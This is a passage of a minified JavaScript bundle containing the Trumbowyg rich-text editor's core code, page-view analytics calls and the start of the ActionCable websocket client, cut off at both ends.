o.html(e)}}catch(r){}return!1};var s=function(o,r){var s=this,a="trumbowyg-icons",l=i.trumbowyg;s.doc=o.ownerDocument||n,s.$ta=i(o),s.$c=i(o),null!=(r=r||{}).lang||null!=l.langs[r.lang]?s.lang=i.extend(!0,{},l.langs.en,l.langs[r.lang]):s.lang=l.langs.en,s.hideButtonTexts=null!=l.hideButtonTexts?l.hideButtonTexts:r.hideButtonTexts;var c=null!=l.svgPath?l.svgPath:r.svgPath;if(s.hasSvg=!1!==c,!1!==c&&(l.svgAbsoluteUseHref||0===i("#"+a,s.doc).length))if(null==c&&i("script[src]").each((function(t,e){var n=e.src,i=n.match("trumbowyg(.min)?.js");null!=i&&(c=n.substring(0,n.indexOf(i[0]))+"ui/icons.svg")})),null==c)console.warn("You must define svgPath: https://goo.gl/CfTY9U");else if(!l.svgAbsoluteUseHref){var u=s.doc.createElement("div");u.id=a,s.doc.body.insertBefore(u,s.doc.body.childNodes[0]),i.ajax({async:!0,type:"GET",contentType:"application/x-www-form-urlencoded; charset=UTF-8",dataType:"xml",crossDomain:!0,url:c,data:null,beforeSend:null,complete:null,success:function(t){u.innerHTML=(new XMLSerializer).serializeToString(t.documentElement)}})}var h=s.doc.querySelector("base")?e.location.href.replace(e.location.hash,""):"";s.svgPath=l.svgAbsoluteUseHref?c:h;var d=s.lang.header,p=function(){return(e.chrome||e.Intl&&Intl.v8BreakIterator)&&"CSS"in e};s.btnsDef={viewHTML:{fn:"toggle",class:"trumbowyg-not-disable"},undo:{isSupported:p,key:"Z"},redo:{isSupported:p,key:"Y"},p:{fn:"formatBlock"},blockquote:{fn:"formatBlock"},h1:{fn:"formatBlock",title:d+" 1"},h2:{fn:"formatBlock",title:d+" 2"},h3:{fn:"formatBlock",title:d+" 3"},h4:{fn:"formatBlock",title:d+" 4"},h5:{fn:"formatBlock",title:d+" 5"},h6:{fn:"formatBlock",title:d+" 6"},subscript:{tag:"sub"},superscript:{tag:"sup"},bold:{key:"B",tag:"b"},italic:{key:"I",tag:"i"},underline:{tag:"u"},strikethrough:{tag:"strike"},strong:{fn:"bold",key:"B"},em:{fn:"italic",key:"I"},del:{fn:"strikethrough"},createLink:{key:"K",tag:"a"},unlink:{},insertImage:{},justifyLeft:{tag:"left",forceCss:!0},justifyCenter:{tag:"center",forceCss:!0},justifyRight:{tag:"right",forceCss:!0},justifyFull:{tag:"justify",forceCss:!0},unorderedList:{fn:"insertUnorderedList",tag:"ul"},orderedList:{fn:"insertOrderedList",tag:"ol"},horizontalRule:{fn:"insertHorizontalRule"},removeformat:{},fullscreen:{class:"trumbowyg-not-disable"},close:{fn:"destroy",class:"trumbowyg-not-disable"},formatting:{dropdown:["p","blockquote","h1","h2","h3","h4"],ico:"p"},link:{dropdown:["createLink","unlink"]}},s.o=i.extend(!0,{},l.defaultOptions,r),s.o.hasOwnProperty("imgDblClickHandler")||(s.o.imgDblClickHandler=s.getDefaultImgDblClickHandler()),s.urlPrefix=s.setupUrlPrefix(),s.disabled=s.o.disabled||"TEXTAREA"===o.nodeName&&o.disabled,r.btns?s.o.btns=r.btns:s.o.semantic||(s.o.btns[3]=["bold","italic","underline","strikethrough"]),i.each(s.o.btnsDef,(function(t,e){s.addBtnDef(t,e)})),s.eventNamespace="trumbowyg-event",s.keys=[],s.tagToButton={},s.tagHandlers=[],s.pasteHandlers=[].concat(s.o.pasteHandlers),s.isIE=-1!==t.userAgent.indexOf("MSIE")||-1!==t.appVersion.indexOf("Trident/"),s.isMac=-1!==t.platform.toUpperCase().indexOf("MAC"),s.init()};s.prototype={DEFAULT_SEMANTIC_MAP:{b:"strong",i:"em",s:"del",strike:"del",div:"p"},init:function(){var t=this;t.height=t.$ta.outerHeight()-39,t.initPlugins();try{t.doc.execCommand("enableObjectResizing",!1,!1),t.doc.execCommand("defaultParagraphSeparator",!1,"p")}catch(e){}t.buildEditor(),t.buildBtnPane(),t.fixedBtnPaneEvents(),t.buildOverlay(),setTimeout((function(){t.disabled&&t.setDisabled(!0),t.$c.trigger("tbwinit")}))},addBtnDef:function(t,e){this.btnsDef[t]=i.extend(e,this.btnsDef[t]||{})},setupUrlPrefix:function(){var t=this.o.urlProtocol;if(t)return"string"!=typeof t?"https://":t.replace("://","")+"://"},buildEditor:function(){var t=this,n=t.o.prefix,o="";t.$box=i("<div/>",{class:n+"box "+n+"editor-visible "+n+t.o.lang+" trumbowyg"}),t.$edBox=i("<div/>",{class:n+"editor-box"}),t.isTextarea=t.$ta.is("textarea"),t.isTextarea?(o=t.$ta.val(),t.$ed=i("<div/>").appendTo(t.$edBox),t.$box.insertAfter(t.$ta).append(t.$edBox,t.$ta)):(t.$ed=t.$ta,o=t.$ed.html(),t.$ta=i("<textarea/>",{name:t.$ta.attr("id"),height:t.height}).val(o),t.$box.insertAfter(t.$ed).append(t.$ta,t.$edBox),t.$edBox.append(t.$ed),t.syncCode()),t.$ta.addClass(n+"textarea").attr("tabindex",-1),t.$ed.addClass(n+"editor").attr({contenteditable:!0,dir:t.lang._dir||"ltr"}).html(o),t.o.tabindex&&t.$ed.attr("tabindex",t.o.tabindex),t.$c.is("[placeholder]")&&t.$ed.attr("placeholder",t.$c.attr("placeholder")),t.$c.is("[spellcheck]")&&t.$ed.attr("spellcheck",t.$c.attr("spellcheck")),t.o.resetCss&&t.$ed.addClass(n+"reset-css"),t.semanticCode(),t.o.autogrowOnEnter&&t.$ed.addClass(n+"autogrow-on-enter");var r,s=!1,a=!1;t.$ed.on("dblclick","img",t.o.imgDblClickHandler).on("keydown",(function(e){var n=e.which;if(8!==n&&13!==n&&46!==n||t.toggleSpan(!0),!e.ctrlKey&&!e.metaKey||e.altKey){if(t.o.tabToIndent&&"Tab"===e.key)try{return e.shiftKey?t.execCmd("outdent",!0,null):t.execCmd("indent",!0,null),!1}catch(o){}}else{s=!0;var i=t.keys[String.fromCharCode(e.which).toUpperCase()];try{return t.execCmd(i.fn,i.param),!1}catch(o){}}})).on("compositionstart compositionupdate",(function(){a=!0})).on("keyup compositionend",(function(e){if("compositionend"===e.type)a=!1;else if(a)return;var n=e.which;if(!(n>=37&&n<=40)){if(8!==n&&13!==n&&46!==n||t.toggleSpan(),!e.ctrlKey&&!e.metaKey||89!==n&&90!==n)if(s||16===n||17===n)void 0===e.which&&t.semanticCode(!1,!1,!0);else{var i=!t.isIE||"compositionend"===e.type;t.semanticCode(!1,i&&13===n),t.$c.trigger("tbwchange")}else t.semanticCode(!1,!0),t.$c.trigger("tbwchange");setTimeout((function(){s=!1}),50)}})).on("input",(function(e){var n=e.originalEvent;"object"==typeof n&&("insertReplacementText"===n.inputType||"insertText"===n.inputType&&null===n.data)&&t.$c.trigger("tbwchange")})).on("mouseup keydown keyup",(function(e){(!e.ctrlKey&&!e.metaKey||e.altKey)&&setTimeout((function(){s=!1}),50),clearTimeout(r),r=setTimeout((function(){t.updateButtonPaneStatus()}),50)})).on("focus blur",(function(e){if("blur"===e.type&&t.clearButtonPaneStatus(),t.$c.trigger("tbw"+e.type),t.o.autogrowOnEnter){if(t.autogrowOnEnterDontClose)return;"focus"===e.type?(t.autogrowOnEnterWasFocused=!0,t.autogrowEditorOnEnter()):t.o.autogrow||(t.$edBox.css({height:t.$edBox.css("min-height")}),t.$c.trigger("tbwresize"))}})).on("keyup focus",(function(){t.$ta.val().match(/<.*>/)||t.$ed.html().match(/<.*>/)||setTimeout((function(){var e=t.isIE?"<p>":"p";t.doc.execCommand("formatBlock",!1,e),t.syncCode()}),0)})).on("cut drop",(function(){setTimeout((function(){t.semanticCode(!1,!0),t.$c.trigger("tbwchange")}),0)})).on("paste",(function(n){if(t.o.removeformatPasted){n.preventDefault(),e.getSelection&&e.getSelection().deleteFromDocument&&e.getSelection().deleteFromDocument();try{var o=e.clipboardData.getData("Text");try{t.doc.selection.createRange().pasteHTML(o)}catch(r){t.doc.getSelection().getRangeAt(0).insertNode(t.doc.createTextNode(o))}t.$c.trigger("tbwchange",n)}catch(s){t.execCmd("insertText",(n.originalEvent||n).clipboardData.getData("text/plain"))}}i.each(t.pasteHandlers,(function(t,e){e(n)})),setTimeout((function(){t.semanticCode(!1,!0),t.$c.trigger("tbwpaste",n),t.$c.trigger("tbwchange")}),0)})),t.$ta.on("keyup",(function(){t.$c.trigger("tbwchange")})).on("paste",(function(){setTimeout((function(){t.$c.trigger("tbwchange")}),0)})),i(t.doc.body).on("keydown."+t.eventNamespace,(function(e){if(27===e.which&&i("."+n+"modal-box").length>=1)return t.closeModal(),!1}))},autogrowEditorOnEnter:function(){var t=this;t.$ed.removeClass("autogrow-on-enter");var e=t.$ed[0].clientHeight;t.$edBox.height("auto");var n=t.$ed[0].scrollHeight;t.$ed.addClass("autogrow-on-enter"),e!==n&&(t.$edBox.height(e),setTimeout((function(){t.$edBox.css({height:n}),t.$c.trigger("tbwresize")}),0))},buildBtnPane:function(){var t=this,e=t.o.prefix,n=t.$btnPane=i("<div/>",{class:e+"button-pane"});i.each(t.o.btns,(function(o,r){Array.isArray(r)||(r=[r]);var s=i("<div/>",{class:e+"button-group "+(r.indexOf("fullscreen")>=0?e+"right":"")});i.each(r,(function(e,n){try{t.isSupportedBtn(n)&&s.append(t.buildBtn(n))}catch(i){}})),s.html().trim().length>0&&n.append(s)})),t.$box.prepend(n)},buildBtn:function(t){var e=this,n=e.o.prefix,o=e.btnsDef[t],r=o.dropdown,s=null==o.hasIcon||o.hasIcon,a=e.lang[t]||t,l=i("<button/>",{type:"button",class:n+t+"-button "+(o.class||"")+(s?"":" "+n+"textual-button"),html:e.hasSvg&&s?'<svg><use xlink:href="'+e.svgPath+"#"+n+(o.ico||t).replace(/([A-Z]+)/g,"-$1").toLowerCase()+'"/></svg>':e.hideButtonTexts?"":o.text||o.title||e.lang[t]||t,title:(o.title||o.text||a)+(o.key?" ("+(e.isMac?"Cmd":"Ctrl")+" + "+o.key+")":""),tabindex:-1,mousedown:function(){return r&&!i("."+t+"-"+n+"dropdown",e.$box).is(":hidden")||i("body",e.doc).trigger("mousedown"),!((e.$btnPane.hasClass(n+"disable")||e.$box.hasClass(n+"disabled"))&&!i(this).hasClass(n+"active")&&!i(this).hasClass(n+"not-disable")||(e.execCmd((r?"dropdown":o.fn)||t,o.param||t,o.forceCss),1))}});if(r){l.addClass(n+"open-dropdown");var c=n+"dropdown",u={class:c+"-"+t+" "+c+" "+n+"fixed-top "+(o.dropdownClass||"")};u["data-"+c]=t;var h=i("<div/>",u);i.each(r,(function(t,n){e.btnsDef[n]&&e.isSupportedBtn(n)&&h.append(e.buildSubBtn(n))})),e.$box.append(h.hide())}else o.key&&(e.keys[o.key]={fn:o.fn||t,param:o.param||t});return r||(e.tagToButton[(o.tag||t).toLowerCase()]=t),l},buildSubBtn:function(t){var e=this,n=e.o.prefix,o=e.btnsDef[t],r=null==o.hasIcon||o.hasIcon;return o.key&&(e.keys[o.key]={fn:o.fn||t,param:o.param||t}),e.tagToButton[(o.tag||t).toLowerCase()]=t,i("<button/>",{type:"button",class:n+t+"-dropdown-button "+(o.class||"")+(o.ico?" "+n+o.ico+"-button":""),html:e.hasSvg&&r?'<svg><use xlink:href="'+e.svgPath+"#"+n+(o.ico||t).replace(/([A-Z]+)/g,"-$1").toLowerCase()+'"/></svg>'+(o.text||o.title||e.lang[t]||t):o.text||o.title||e.lang[t]||t,title:o.key?"("+(e.isMac?"Cmd":"Ctrl")+" + "+o.key+")":null,style:o.style||null,mousedown:function(){return i("body",e.doc).trigger("mousedown"),e.execCmd(o.fn||t,o.param||t,o.forceCss),!1}})},isSupportedBtn:function(t){try{return this.btnsDef[t].isSupported()}catch(e){}return!0},buildOverlay:function(){var t=this;return t.$overlay=i("<div/>",{class:t.o.prefix+"overlay"}).appendTo(t.$box),t.$overlay},showOverlay:function(){var t=this;i(e).trigger("scroll"),t.$overlay.fadeIn(200),t.$box.addClass(t.o.prefix+"box-blur")},hideOverlay:function(){var t=this;t.$overlay.fadeOut(50),t.$box.removeClass(t.o.prefix+"box-blur")},fixedBtnPaneEvents:function(){var t=this,n=t.o.fixedFullWidth,o=t.$box;t.o.fixedBtnPane&&(t.isFixed=!1,i(e).on("scroll."+t.eventNamespace+" resize."+t.eventNamespace,(function(){if(o){t.syncCode();var r=i(e).scrollTop(),s=o.offset().top+1,a=t.$btnPane,l=a.outerHeight()-2;r-s>0&&r-s-t.height<0?(t.isFixed||(t.isFixed=!0,a.css({position:"fixed",top:0,left:n?0:"auto",zIndex:7}),t.$box.css({paddingTop:a.height()})),a.css({width:n?"100%":o.width()-1}),i("."+t.o.prefix+"fixed-top",o).css({position:n?"fixed":"absolute",top:n?l:l+(r-s),zIndex:15})):t.isFixed&&(t.isFixed=!1,a.removeAttr("style"),t.$box.css({paddingTop:0}),i("."+t.o.prefix+"fixed-top",o).css({position:"absolute",top:l}))}})))},setDisabled:function(t){var e=this,n=e.o.prefix;e.disabled=t,t?e.$ta.attr("disabled",!0):e.$ta.removeAttr("disabled"),e.$box.toggleClass(n+"disabled",t),e.$ed.attr("contenteditable",!t)},destroy:function(){var t=this,n=t.o.prefix;t.isTextarea?t.$box.after(t.$ta.css({height:""}).val(t.html()).removeClass(n+"textarea").show()):t.$box.after(t.$edBox.css({height:""}).removeClass(n+"editor").removeAttr("contenteditable").removeAttr("dir").html(t.html()).show()),t.$ed.off("dblclick","img"),t.destroyPlugins(),t.$box.remove(),t.$c.removeData("trumbowyg"),i("body").removeClass(n+"body-fullscreen"),t.$c.trigger("tbwclose"),i(e).off("scroll."+t.eventNamespace+" resize."+t.eventNamespace),i(t.doc.body).off("keydown."+t.eventNamespace)},empty:function(){this.doc.execCommand("insertHTML",!1,""),this.$ta.val(""),this.syncCode(!0)},toggle:function(){var t=this,e=t.o.prefix;t.o.autogrowOnEnter&&(t.autogrowOnEnterDontClose=!t.$box.hasClass(e+"editor-hidden")),t.semanticCode(!1,!0),t.$c.trigger("tbwchange"),setTimeout((function(){t.doc.activeElement.blur(),t.$box.toggleClass(e+"editor-hidden "+e+"editor-visible"),t.$btnPane.toggleClass(e+"disable"),i("."+e+"viewHTML-button",t.$btnPane).toggleClass(e+"active"),t.$box.hasClass(e+"editor-visible")?t.$ta.attr("tabindex",-1):t.$ta.removeAttr("tabindex"),t.o.autogrowOnEnter&&!t.autogrowOnEnterDontClose&&t.autogrowEditorOnEnter()}),0)},toggleSpan:function(t){this.$ed.find("span").each((function(){!0===t?i(this).attr("data-tbw-flag",!0):i(this).attr("data-tbw-flag")?i(this).removeAttr("data-tbw-flag"):i(this).contents().unwrap()}))},dropdown:function(t){var n=this,o=i("body",n.doc),r=n.o.prefix,s=i("[data-"+r+"dropdown="+t+"]",n.$box),a=i("."+r+t+"-button",n.$btnPane),l=s.is(":hidden");if(o.trigger("mousedown"),l){var c=a.offset().left;a.addClass(r+"active"),s.css({position:"absolute",top:a.offset().top-n.$btnPane.offset().top+a.outerHeight(),left:n.o.fixedFullWidth&&n.isFixed?c:c-n.$btnPane.offset().left}).show(),i(e).trigger("scroll"),o.on("mousedown."+n.eventNamespace,(function(t){s.is(t.target)||(i("."+r+"dropdown",n.$box).hide(),i("."+r+"active",n.$btnPane).removeClass(r+"active"),o.off("mousedown."+n.eventNamespace))}))}},html:function(t){var e=this;return null!=t?(e.$ta.val(t),e.syncCode(!0),e.$c.trigger("tbwchange"),e):e.$ta.val()},syncTextarea:function(){var t=this;t.$ta.val(t.$ed.text().trim().length>0||t.$ed.find(t.o.tagsToKeep.join(",")).length>0?t.$ed.html():"")},syncCode:function(t){var e=this;if(!t&&e.$ed.is(":visible"))e.syncTextarea();else{var n=i("<div>").html(e.$ta.val()),o=i("<div>").append(n);i(e.o.tagsToRemove.join(","),o).remove(),e.$ed.html(o.contents().html())}if(e.o.autogrow&&(e.height=e.$edBox.height(),e.height!==e.$ta.css("height")&&(e.$ta.css({height:e.height}),e.$c.trigger("tbwresize"))),e.o.autogrowOnEnter){e.$edBox.height("auto");var r=e.autogrowOnEnterWasFocused?e.$edBox[0].scrollHeight:e.$edBox.css("min-height");r!==e.$ta.css("height")&&(e.$edBox.css({height:r}),e.$c.trigger("tbwresize"))}},semanticCode:function(t,e,n){var o=this;o.saveRange(),o.syncCode(t);var r=!0;if(o.range&&o.range.collapsed&&(r=!1),o.o.semantic){if(o.semanticTag("b",o.o.semanticKeepAttributes),o.semanticTag("i",o.o.semanticKeepAttributes),o.semanticTag("s",o.o.semanticKeepAttributes),o.semanticTag("strike",o.o.semanticKeepAttributes),e){var s=o.o.inlineElementsSelector,a=":not("+s+")";o.$ed.contents().filter((function(){return 3===this.nodeType&&this.nodeValue.trim().length>0})).wrap("<span data-tbw/>");var l=function(t){if(0!==t.length){var e=t.nextUntil(a).addBack().wrapAll("<p/>").parent(),n=e.nextAll(s).first();e.next("br").remove(),l(n)}};l(o.$ed.children(s).first()),o.semanticTag("div",!0),i("[data-tbw]",o.$ed).contents().unwrap(),o.$ed.find("p:empty").remove()}!n&&r&&o.restoreRange(),o.syncTextarea()}},semanticTag:function(t,e,n){var o,r=this,s=t;if(null!=this.o.semantic&&"object"==typeof this.o.semantic&&this.o.semantic.hasOwnProperty(t))o=this.o.semantic[t];else{if(!0!==this.o.semantic||!this.DEFAULT_SEMANTIC_MAP.hasOwnProperty(t))return;o=this.DEFAULT_SEMANTIC_MAP[t]}n&&(t=o,o=s),i(t,this.$ed).each((function(){var t=!1,n=i(this);if(0===n.contents().length)return!1;r.range&&r.range.startContainer.parentNode===this&&(t=!0);var s=i("<"+o+"/>");s.insertBefore(n),e&&i.each(n.prop("attributes"),(function(){s.attr(this.name,this.value)})),s.html(n.html()),n.remove(),!0===t&&(r.range.selectNodeContents(s.get(0)),r.range.collapse(!1))}))},createLink:function(){for(var t,e,n,o=this,r=o.doc.getSelection(),s=r.getRangeAt(0),a=r.focusNode,l=(new XMLSerializer).serializeToString(s.cloneContents())||s+"",c=o.o.linkTargets[0];["A","DIV"].indexOf(a.nodeName)<0;)a=a.parentNode;if(a&&"A"===a.nodeName){var u=i(a);l=u.text(),t=u.attr("href"),o.o.minimalLinks||(e=u.attr("title"),n=u.attr("target")||c);var h=o.doc.createRange();h.selectNode(a),r.removeAllRanges(),r.addRange(h)}o.saveRange();var d={url:{label:o.lang.linkUrl||"URL",required:!0,value:t},text:{label:o.lang.text,value:l}};if(!o.o.minimalLinks){var p=o.o.linkTargets.reduce((function(t,e){return t[e]=o.lang[e],t}),{});i.extend(d,{title:{label:o.lang.title,value:e},target:{label:o.lang.target,value:n,options:p}})}o.openModalInsert(o.lang.createLink,d,(function(t){var e=o.prependUrlPrefix(t.url);if(!e.length)return!1;var n=i(['<a href="',e,'">',t.text||t.url,"</a>"].join(""));return t.title&&n.attr("title",t.title),(t.target||c)&&n.attr("target",t.target||c),o.range.deleteContents(),o.range.insertNode(n[0]),o.syncCode(),o.$c.trigger("tbwchange"),!0}))},prependUrlPrefix:function(t){return this.urlPrefix?/^([a-z][-+.a-z0-9]*:|\/|#)/i.test(t)?t:/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(t)?"mailto:"+t:this.urlPrefix+t:t},unlink:function(){var t=this,e=t.doc.getSelection(),n=e.focusNode;if(e.isCollapsed){for(;["A","DIV"].indexOf(n.nodeName)<0;)n=n.parentNode;if(n&&"A"===n.nodeName){var i=t.doc.createRange();i.selectNode(n),e.removeAllRanges(),e.addRange(i)}}t.execCmd("unlink",void 0,void 0,!0)},insertImage:function(){var t=this;t.saveRange();var e={url:{label:"URL",required:!0},alt:{label:t.lang.description,value:t.getRangeText()}};t.o.imageWidthModalEdit&&(e.width={}),t.openModalInsert(t.lang.insertImage,e,(function(e){t.execCmd("insertImage",e.url,!1,!0);var n=i('img[src="'+e.url+'"]:not([alt])',t.$box);return n.attr("alt",e.alt),t.o.imageWidthModalEdit&&n.attr({width:e.width}),t.syncCode(),t.$c.trigger("tbwchange"),!0}))},fullscreen:function(){var t,n=this,o=n.o.prefix,r=o+"fullscreen",s=r+"-placeholder",a=n.$box.outerHeight();n.$box.toggleClass(r),(t=n.$box.hasClass(r))?n.$box.before(i("<div/>",{class:s}).css({height:a})):i("."+s).remove(),i("body").toggleClass(o+"body-fullscreen",t),i(e).trigger("scroll"),n.$c.trigger("tbw"+(t?"open":"close")+"fullscreen")},execCmd:function(t,n,o,r){var s=this;r=!!r||"","dropdown"!==t&&s.$ed.focus(),"strikethrough"===t&&s.o.semantic&&s.semanticTag("strike",s.o.semanticKeepAttributes,!0);try{s.doc.execCommand("styleWithCSS",!1,o||!1)}catch(c){}try{s[t+r](n)}catch(c){try{t(n)}catch(u){"insertHorizontalRule"===t?n=void 0:"formatBlock"===t&&s.isIE&&(n="<"+n+">"),s.doc.execCommand(t,!1,n),s.syncCode(),s.semanticCode(!1,!0);try{var a=e.getSelection().focusNode;i(e.getSelection().focusNode.parentNode).hasClass("trumbowyg-editor")||(a=e.getSelection().focusNode.parentNode);var l=s.o.tagClasses[n];l&&i(a).addClass(l)}catch(h){}}"dropdown"!==t&&(s.updateButtonPaneStatus(),s.$c.trigger("tbwchange"))}},openModal:function(t,n,s){var a=this,l=a.o.prefix;if(s=!1!==s,i("."+l+"modal-box",a.$box).length>0)return!1;a.o.autogrowOnEnter&&(a.autogrowOnEnterDontClose=!0),a.saveRange(),a.showOverlay(),a.$btnPane.addClass(l+"disable");var c,u=i("<div/>",{class:l+"modal "+l+"fixed-top"}).css({top:a.$box.offset().top+a.$btnPane.height(),zIndex:99999}).appendTo(i(a.doc.body)),h=l+"dark";0!==a.$c.parents("."+h).length&&u.addClass(h),a.$overlay.one("click",(function(){return u.trigger(r),!1})),c=s?i("<form/>",{action:"",html:n}).on("submit",(function(){return u.trigger(o),!1})).on("reset",(function(){return u.trigger(r),!1})).on("submit reset",(function(){a.o.autogrowOnEnter&&(a.autogrowOnEnterDontClose=!1)})):n;var d=i("<div/>",{class:l+"modal-box",html:c}).css({top:"-"+a.$btnPane.outerHeight(),opacity:0,paddingBottom:s?null:"5%"}).appendTo(u).animate({top:0,opacity:1},100);return t&&i("<span/>",{text:t,class:l+"modal-title"}).prependTo(d),s&&(i(":input:first",d).focus(),a.buildModalBtn("submit",d),a.buildModalBtn("reset",d),u.height(d.outerHeight()+10)),i(e).trigger("scroll"),a.$c.trigger("tbwmodalopen"),u},buildModalBtn:function(t,e){var o=this.o.prefix;return i("<button/>",{class:o+"modal-button "+o+"modal-"+t,type:t,text:this.lang[t]||t}).appendTo(i("form",e))},closeModal:function(){var t=this,e=t.o.prefix;t.$btnPane.removeClass(e+"disable"),t.$overlay.off();var n=i("."+e+"modal-box",i(t.doc.body));n.animate({top:"-"+n.height()},100,(function(){n.parent().remove(),t.hideOverlay(),t.$c.trigger("tbwmodalclose")})),t.restoreRange()},openModalInsert:function(t,e,n){var s=this,a=s.o.prefix,l=s.lang,c="",u=a+"form-"+Date.now()+"-";return i.each(e,(function(t,e){var n=e.label||t,o=e.name||t,r=e.attributes||{},s=u+t,h=Object.keys(r).map((function(t){return t+'="'+r[t]+'"'})).join(" ");if("function"==typeof e.type)return e.name||(e.name=o),void(c+=e.type(e,s,a,l));c+='<div class="'+a+'input-row">',c+='<div class="'+a+'input-infos"><label for="'+s+'"><span>'+(l[n]?l[n]:n)+"</span></label></div>",c+='<div class="'+a+'input-html">',i.isPlainObject(e.options)?(c+='<select name="target">',c+=Object.keys(e.options).map((t=>'<option value="'+t+'" '+(t===e.value?"selected":"")+">"+e.options[t]+"</option>")).join(""),c+="</select>"):(c+='<input id="'+s+'" type="'+(e.type||"text")+'" name="'+o+'" '+h,c+=("checkbox"===e.type&&e.value?' checked="checked"':"")+' value="'+(e.value||"").replace(/"/g,"&quot;")+'">'),c+="</div></div>"})),s.openModal(t,c).on(o,(function(){var t=i("form",i(this)),r=!0,a={};i.each(e,(function(e,n){var o=n.name||e,l=i(':input[name="'+o+'"]',t);switch(l[0].type.toLowerCase()){case"checkbox":a[o]=l.is(":checked");break;case"radio":a[o]=l.filter(":checked").val();break;default:a[o]=i.trim(l.val())}n.required&&""===a[o]?(r=!1,s.addErrorOnModalField(l,s.lang.required)):n.pattern&&!n.pattern.test(a[o])&&(r=!1,s.addErrorOnModalField(l,n.patternError))})),r&&(s.restoreRange(),n(a,e)&&(s.syncCode(),s.$c.trigger("tbwchange"),s.closeModal(),i(this).off(o)))})).one(r,(function(){i(this).off(o),s.closeModal()}))},addErrorOnModalField:function(t,e){var n=this.o.prefix,o=n+"msg-error",r=t.closest("."+n+"input-row");t.on("change keyup",(function(){r.removeClass(n+"input-error"),setTimeout((function(){r.find("."+o).remove()}),150)})),r.addClass(n+"input-error").find("."+n+"input-infos label").append(i("<span/>",{class:o,text:e}))},getDefaultImgDblClickHandler:function(){var t=this;return function(){var e=i(this),n=e.attr("src"),o="(Base64)";0===n.indexOf("data:image")&&(n=o);var r={url:{label:"URL",value:n,required:!0},alt:{label:t.lang.description,value:e.attr("alt")}};return t.o.imageWidthModalEdit&&(r.width={value:e.attr("width")?e.attr("width"):""}),t.openModalInsert(t.lang.insertImage,r,(function(n){return n.url!==o&&e.attr({src:n.url}),e.attr({alt:n.alt}),t.o.imageWidthModalEdit&&(parseInt(n.width)>0?e.attr({width:n.width}):e.removeAttr("width")),!0})),!1}},saveRange:function(){var t=this,e=t.doc.getSelection();if(t.range=null,e&&e.rangeCount){var n,i=t.range=e.getRangeAt(0),o=t.doc.createRange();o.selectNodeContents(t.$ed[0]),o.setEnd(i.startContainer,i.startOffset),n=(o+"").length,t.metaRange={start:n,end:n+(i+"").length}}},restoreRange:function(){var t,e=this,n=e.metaRange,i=e.range,o=e.doc.getSelection();if(i){if(n&&n.start!==n.end){var r,s=0,a=[e.$ed[0]],l=!1,c=!1;for(t=e.doc.createRange();!c&&(r=a.pop());)if(3===r.nodeType){var u=s+r.length;!l&&n.start>=s&&n.start<=u&&(t.setStart(r,n.start-s),l=!0),l&&n.end>=s&&n.end<=u&&(t.setEnd(r,n.end-s),c=!0),s=u}else for(var h=r.childNodes,d=h.length;d>0;)d-=1,a.push(h[d])}try{o.removeAllRanges()}catch(p){}o.addRange(t||i)}},getRangeText:function(){return this.range+""},clearButtonPaneStatus:function(){var t=this,e=t.o.prefix,n=e+"active-button "+e+"active",o=e+"original-icon";i("."+e+"active-button",t.$btnPane).removeClass(n),i("."+o,t.$btnPane).each((function(){i(this).find("svg use").attr("xlink:href",i(this).data(o))}))},updateButtonPaneStatus:function(){var t=this,e=t.o.prefix,n=e+"active-button "+e+"active",o=e+"original-icon",r=t.getTagsRecursive(t.doc.getSelection().anchorNode);t.clearButtonPaneStatus(),i.each(r,(function(r,s){var a=t.tagToButton[s.toLowerCase()],l=i("."+e+a+"-button",t.$btnPane);if(l.length>0)l.addClass(n);else try{var c=(l=i("."+e+"dropdown ."+e+a+"-dropdown-button",t.$box)).find("svg use"),u=l.parent().data(e+"dropdown"),h=i("."+e+u+"-button",t.$box),d=h.find("svg use");h.addClass(n),t.o.changeActiveDropdownIcon&&c.length>0&&(h.addClass(o).data(o,d.attr("xlink:href")),d.attr("xlink:href",c.attr("xlink:href")))}catch(p){}}))},getTagsRecursive:function(t,e){var n=this;if(e=e||(t&&t.tagName?[t.tagName]:[]),!t||!t.parentNode)return e;t.nodeType!==Node.ELEMENT_NODE&&(t=t.parentNode);var o=t.tagName;return"DIV"===o?e:("P"===o&&""!==t.style.textAlign&&e.push(t.style.textAlign),i.each(n.tagHandlers,(function(i,o){e=e.concat(o(t,n))})),e.push(o),n.getTagsRecursive(t.parentNode,e).filter((function(t){return null!=t})))},initPlugins:function(){var t=this;t.loadedPlugins=[],i.each(i.trumbowyg.plugins,(function(e,n){n.shouldInit&&!n.shouldInit(t)||(n.init(t),n.tagHandler&&t.tagHandlers.push(n.tagHandler),t.loadedPlugins.push(n))}))},destroyPlugins:function(){var t=this;i.each(this.loadedPlugins,(function(e,n){n.destroy&&n.destroy(t)}))}}}(navigator,window,document,jQuery),$(document).ready((function(){editorInit(),imagesDelete(),showAdvanced()})),$((function(){"function"==typeof fbq&&fbq("track","PageView"),"function"==typeof fathom&&fathom("trackPageview")})),function(t,e){"object"==typeof exports&&"undefined"!=typeof module?e(exports):"function"==typeof define&&define.amd?define(["exports"],e):e((t="undefined"!=typeof globalThis?globalThis:t||self).ActionCable={})}(this,(function(t){"use strict";function e(t){if("function"==typeof t&&(t=t()),t&&!/^wss?:/i.test(t)){const e=document.createElement("a");return e.href=t,e.href=e.href,e.protocol=e.protocol.replace("http","ws"),e.href}return t}function i(t){const e=document.head.querySelector(`meta[name='action-cable-${t}']`);if(e)return e.getAttribute("content")}var o={logger:self.console,WebSocket:self.WebSocket},r={log(...t){this.enabled&&(t.push(Date.now()),o.logger.log("[ActionCable]",...t))}};const s=()=>(new Date).getTime(),a=t=>(s()-t)/1e3;class l{constructor(t){this.visibilityDidChange=this.visibilityDidChange.bind(this),this.connection=t,this.reconnectAttempts=0}start(){this.isRunning()||(this.startedAt=s(),delete this.stoppedAt,this.startPolling(),addEventListener("visibilitychange",this.visibilityDidChange),r.log(`ConnectionMonitor started. stale threshold = ${this.constructor.staleThreshold} s`))}stop(){this.isRunning()&&(this.stoppedAt=s(),this.stopPolling(),removeEventListener("visibilitychange",this.visibilityDidChange),r.log("ConnectionMonitor stopped"))}isRunning(){return this.startedAt&&!this.stoppedAt}recordPing(){this.pingedAt=s()}recordConnect(){this.reconnectAttempts=0,this.recordPing(),delete this.disconnectedAt,r.log("ConnectionMonitor recorded connect")}recordDisconnect(){this.disconnectedAt=s(),r.log("ConnectionMonitor recorded 